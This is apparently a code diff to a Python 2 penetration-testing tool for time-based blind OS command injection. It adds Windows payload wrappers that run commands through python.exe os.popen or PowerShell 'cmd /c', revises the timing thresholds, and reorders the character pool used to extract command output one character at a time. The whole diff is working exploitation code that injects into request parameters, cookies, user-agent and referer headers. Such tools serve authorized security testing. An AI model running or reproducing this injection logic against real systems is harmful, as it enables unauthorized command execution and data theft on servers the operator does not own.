@@ -106,7 +106,7 @@ def get_request_response(request):
 """
 Examine the GET/POST requests
 """
-def examine_requests(payload, vuln_parameter, http_request_method, url):
+def examine_requests(payload, vuln_parameter, http_request_method, url, delay, url_time_response):
 
   start = 0
   end = 0
@@ -114,12 +114,7 @@ def examine_requests(payload, vuln_parameter, http_request_method, url):
 
   # Check if defined method is GET (Default).
   if http_request_method == "GET":
-    
-    payload = urllib.quote(payload)
-    
-    # Check if its not specified the 'INJECT_HERE' tag
-    #url = parameters.do_GET_check(url)
-    
+    payload = urllib.quote(payload)   
     target = re.sub(settings.INJECT_TAG, payload, url)
     vuln_parameter = ''.join(vuln_parameter)
     request = urllib2.Request(target)
@@ -128,7 +123,6 @@ def examine_requests(payload, vuln_parameter, http_request_method, url):
   else :
     parameter = menu.options.data
     parameter = urllib2.unquote(parameter)
-    
     # Check if its not specified the 'INJECT_HERE' tag
     parameter = parameters.do_POST_check(parameter)
     
@@ -145,7 +139,6 @@ def examine_requests(payload, vuln_parameter, http_request_method, url):
 
   # Check if defined extra headers.
   headers.do_check(request)
-
   # Get the response of the request
   response = get_request_response(request)
 
@@ -162,19 +155,12 @@ def injection_test(payload, http_request_method, url):
   start = 0
   end = 0
   start = time.time()
-  
   # Check if defined method is GET (Default).
-  if http_request_method == "GET":
-    
-    # Check if its not specified the 'INJECT_HERE' tag
-    #url = parameters.do_GET_check(url)
-    
+  if http_request_method == "GET":   
     # Encoding non-ASCII characters payload.
     payload = urllib.quote(payload)
-    
     # Define the vulnerable parameter
     vuln_parameter = parameters.vuln_GET_param(url)
-      
     target = re.sub(settings.INJECT_TAG, payload, url)
     request = urllib2.Request(target)
               
@@ -182,10 +168,8 @@ def injection_test(payload, http_request_method, url):
   else:
     parameter = menu.options.data
     parameter = urllib2.unquote(parameter)
-    
     # Check if its not specified the 'INJECT_HERE' tag
     parameter = parameters.do_POST_check(parameter)
-    
     # Define the vulnerable parameter
     vuln_parameter = parameters.vuln_POST_param(parameter, url)
     
@@ -204,7 +188,6 @@ def injection_test(payload, http_request_method, url):
   
   # Get the response of the request
   response = get_request_response(request)
-  
   end  = time.time()
   how_long = int(end - start)
 
@@ -235,7 +218,6 @@ def cookie_injection_test(url, vuln_parameter, payload):
 
   proxy = None 
   response = inject_cookie(url, vuln_parameter, payload, proxy)
-  
   # Check if defined any HTTP Proxy.
   if menu.options.proxy:
     try:
@@ -324,7 +306,6 @@ def user_agent_injection_test(url, vuln_parameter, payload):
 
   proxy = None 
   response = inject_user_agent(url, vuln_parameter, payload, proxy)
-  
   # Check if defined any HTTP Proxy.
   if menu.options.proxy:
     try:
@@ -479,7 +460,14 @@ def referer_injection_test(url, vuln_parameter, payload):
 """
 The main command injection exploitation.
 """
-def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):
+def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response):
+  
+  if settings.TARGET_OS == "win":
+    previous_cmd = cmd
+    if alter_shell:
+      cmd = settings.WIN_PYTHON_DIR + "python.exe -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
+    else: 
+      cmd = "powershell.exe write-host ([string](cmd /c " + cmd + ")).trim().length"
 
   if menu.options.file_write or menu.options.file_upload:
     minlen = 0
@@ -487,119 +475,122 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_m
     minlen = 1
 
   found_chars = False
-  
   sys.stdout.write("(*) Retrieving the length of execution output... ")
   sys.stdout.flush()  
-
   for output_length in range(int(minlen), int(maxlen)):
-    
     if alter_shell:
       # Execute shell commands on vulnerable host.
       payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request_method)
     else:
       # Execute shell commands on vulnerable host.
-      payload = tb_payloads.cmd_execution(separator, cmd, output_length, delay, http_request_method)
-          
+      payload = tb_payloads.cmd_execution(separator, cmd, output_length, delay, http_request_method) 
     # Fix prefixes / suffixes
     payload = parameters.prefixes(payload, prefix)
     payload = parameters.suffixes(payload, suffix)
-
     if menu.options.base64:
       payload = base64.b64encode(payload)
-
     # Check if defined "--verbose" option.
     if menu.options.verbose:
       sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)
-    
     # Check if defined cookie with "INJECT_HERE" tag
     if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
       how_long = cookie_injection_test(url, vuln_parameter, payload)
-
     # Check if defined user-agent with "INJECT_HERE" tag
     elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
       how_long = user_agent_injection_test(url, vuln_parameter, payload)
-
     # Check if defined referer with "INJECT_HERE" tag
     elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
       how_long = referer_injection_test(url, vuln_parameter, payload)
-
     else:  
-      how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
-    
-    if how_long >= delay:
+      how_long = examine_requests(payload, vuln_parameter, http_request_method, url, delay, url_time_response)
+    # Examine time-responses
+    injection_check = False
+    if settings.TARGET_OS == "win" and alter_shell is not None :
+      if (how_long > settings.FOUND_HOW_LONG and how_long - delay >= settings.FOUND_DIFF):
+        injection_check = True
+    else:
+      if (how_long >= settings.FOUND_HOW_LONG and how_long - delay >= settings.FOUND_DIFF):
+        injection_check = True
+    if injection_check == True:        
       if output_length > 1:
         if menu.options.verbose:
           print "\n"
         else:
-          sys.stdout.write("["+Fore.GREEN+" SUCCEED "+ Style.RESET_ALL+"]\n")
+          sys.stdout.write("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL+ "]\n")
           sys.stdout.flush()
-        print Style.BRIGHT + "(!) Retrieved " + str(output_length) + " characters."+ Style.RESET_ALL
-        found_chars = True
+        print Style.BRIGHT + "(!) Retrieved " + str(output_length) + " characters." + Style.RESET_ALL
+      found_chars = True
+      injection_check = False
       break
 
+  # Proceed with the next (injection) step!
   if found_chars == True : 
     num_of_chars = output_length + 1
     check_start = 0
     check_end = 0
     check_start = time.time()
-    
+    if settings.TARGET_OS == "win":
+      cmd = previous_cmd
     output = []
-
-    percent = 0
-    sys.stdout.write("\r(*) Grabbing the output, please wait... [ "+str(percent)+"% ]")
+    percent = "0.0"
+    sys.stdout.write("\r(*) Grabbing the output, please wait... [ " +str(percent)+ "% ]")
     sys.stdout.flush()
-
     for num_of_chars in range(1, int(num_of_chars)):
-      for ascii_char in range(32, 129):
-        
+      if num_of_chars == 1:
+        # Checks {A..Z},{a..z},{0..9},{Symbols}
+        char_pool = range(65, 90) + range(96, 122)
+      else:
+        # Checks {a..z},{A..Z},{0..9},{Symbols}
+        char_pool = range(96, 122) + range(65, 90)
+      char_pool = char_pool + range(48, 57) + range(32, 48) + range(90, 96)  + range(57, 65)  + range(122, 127) 
+      for ascii_char in char_pool:
         if alter_shell:
           # Get the execution output, of shell execution.
           payload = tb_payloads.get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
         else:
           # Get the execution output, of shell execution.
           payload = tb_payloads.get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
-          
         # Fix prefixes / suffixes
         payload = parameters.prefixes(payload, prefix)
         payload = parameters.suffixes(payload, suffix)
-
         if menu.options.base64:
           payload = base64.b64encode(payload)
-          
         # Check if defined "--verbose" option.
         if menu.options.verbose:
           sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)
-
         # Check if defined cookie with "INJECT_HERE" tag
         if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
           how_long = cookie_injection_test(url, vuln_parameter, payload)
-
         # Check if defined user-agent with "INJECT_HERE" tag
         elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
           how_long = user_agent_injection_test(url, vuln_parameter, payload)
-
         # Check if defined referer with "INJECT_HERE" tag
         elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
           how_long = referer_injection_test(url, vuln_parameter, payload)
-
         else:    
-          how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
-                
-        if how_long >= delay:
+          how_long = examine_requests(payload, vuln_parameter, http_request_method, url, delay, url_time_response)
+        # Examine time-responses
+        injection_check = False
+        if settings.TARGET_OS == "win" and alter_shell is not None :
+          if (how_long > settings.FOUND_HOW_LONG and how_long - delay >= settings.FOUND_DIFF):
+            injection_check = True
+        else:
+          if (how_long >= settings.FOUND_HOW_LONG and how_long - delay >= settings.FOUND_DIFF):
+            injection_check = True
+        if injection_check == True:
           if not menu.options.verbose:
             output.append(chr(ascii_char))
             percent = ((num_of_chars*100)/output_length)
-            float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(output_length*1.0)),2))
-            sys.stdout.write("\r(*) Grabbing the output, please wait... [ "+str(float_percent)+"% ]")
+            float_percent = "{0:.1f}".format(round(((num_of_chars * 100)/(output_length * 1.0)),2))
+            sys.stdout.write("\r(*) Grabbing the output, please wait... [ " +str(float_percent)+ "% ]")
             sys.stdout.flush()
           else:
             output.append(chr(ascii_char))
+          injection_check = False  
           break
-      
     check_end  = time.time()
     check_how_long = int(check_end - check_start)
     output = "".join(str(p) for p in output)
-
     # Check for empty output.
     if output == (len(output) * " "):
       output = ""
@@ -607,7 +598,7 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_m
   else:
     check_start = 0
     if not menu.options.verbose:
-      sys.stdout.write("["+Fore.RED+" FAILED "+ Style.RESET_ALL+"]\n")
+      sys.stdout.write("[" +Fore.RED+ " FAILED " + Style.RESET_ALL+ "]\n")
       sys.stdout.flush()
     else:
       print ""
@@ -619,10 +610,7 @@ def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_m
 """
 False Positive check and evaluation.
 """
-def false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long):
-  
-  # Log previous 'how_long' for later comparison
-  previous_how_long = how_long
+def false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response):
 
   found_chars = False
   if menu.options.verbose: 
@@ -630,14 +618,13 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_reques
     sys.stdout.flush()
 
   for output_length in range(1, 3):
-
+    
+    # Execute shell commands on vulnerable host.
     if alter_shell:
-      # Execute shell commands on vulnerable host.
       payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request_method)
     else:
-      # Execute shell commands on vulnerable host.
       payload = tb_payloads.cmd_execution(separator, cmd, output_length, delay, http_request_method)
-          
+    
     # Fix prefixes / suffixes
     payload = parameters.prefixes(payload, prefix)
     payload = parameters.suffixes(payload, suffix)
@@ -662,9 +649,9 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_reques
       how_long = referer_injection_test(url, vuln_parameter, payload)
 
     else:  
-      how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
-    
-    if (previous_how_long == how_long) and (how_long >= delay):
+      how_long = examine_requests(payload, vuln_parameter, http_request_method, url, delay, url_time_response)
+
+    if (how_long >= settings.FOUND_HOW_LONG) and (how_long - delay >= settings.FOUND_DIFF):
       found_chars = True
       break
 
@@ -676,18 +663,13 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_reques
     
     output = []
     percent = 0
-
-    # Log previous 'how_long' for later comparison
-    previous_how_long = how_long
-
     sys.stdout.flush()
     for num_of_chars in range(1, int(num_of_chars)):
       for ascii_char in range(1, 3):
-        
+
         if alter_shell:
           # Get the execution output, of shell execution.
           payload = tb_payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
-        
         else:
           # Get the execution output, of shell execution.
           payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
@@ -716,9 +698,9 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_reques
           how_long = referer_injection_test(url, vuln_parameter, payload)
 
         else:    
-          how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
+          how_long = examine_requests(payload, vuln_parameter, http_request_method, url, delay, url_time_response)
 
-        if (previous_how_long == how_long) and (how_long >= delay):
+        if (how_long >= settings.FOUND_HOW_LONG) and (how_long - delay >= settings.FOUND_DIFF):
           output.append(ascii_char)
           break
       
@@ -738,17 +720,20 @@ def export_injection_results(cmd, separator, output, check_how_long):
     print ""
   if output != "" and check_how_long != 0 :
     print "\n\n" + Fore.GREEN + Style.BRIGHT + output + Style.RESET_ALL
-    sys.stdout.write("\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) + ".")
+    sys.stdout.write("\n(*) Finished in " + time.strftime('%H:%M:%S', time.gmtime(check_how_long)) + ".")
     if not menu.options.os_cmd:
       print ""
   else:
     # Check if exists pipe filtration.
     if output != False :
        print "\n" + Fore.YELLOW  + "(^) Warning: It appears that '" + cmd + "' command could not return any output" + (', due to pipe (|) filtration on target host.', '.')[separator == "||"]  + Style.RESET_ALL
-       print Fore.YELLOW  + "             "+ ('To bypass that limitation, u', 'U')[separator == "||"]  +"se '--alter-shell' or try another injection technique (i.e. '--technique=\"f\"')" + Style.RESET_ALL 
+       print Fore.YELLOW  + "             " + ('To bypass that limitation, u', 'U')[separator == "||"]  + "se '--alter-shell' or try another injection technique (i.e. '--technique=\"f\"')" + Style.RESET_ALL 
        sys.exit(0)
     # Check for fault command.
     else:
        print Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL + "\n"
+  
+  if settings.ENUMERATION_DONE and not menu.options.verbose:
+    print ""
 
 #eof
